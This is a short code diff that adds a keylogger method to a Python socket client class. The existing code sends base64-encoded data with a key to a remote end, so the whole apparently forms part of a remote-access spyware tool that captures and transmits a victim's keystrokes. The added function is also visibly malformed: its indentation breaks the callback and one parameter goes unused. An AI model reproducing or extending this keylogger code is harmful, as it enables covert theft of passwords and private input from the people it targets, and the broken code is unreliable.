@@ -14,3 +14,15 @@ class CLIENT:
             self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
         else:
             self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
+
+    def turn_keylogger(self, status):
+        def on_press(key):
+            if not self.KEYLOGGER_STATUS:
+                return False
+        
+        key = str(key)
+        
+        if len(key.strip('\'')) == 1:
+            self.KEYLOGGER_STROKES += key.strip('\'')
+        else:
+            self.KEYLOGGER_STROKES += ("[" + key + "]")
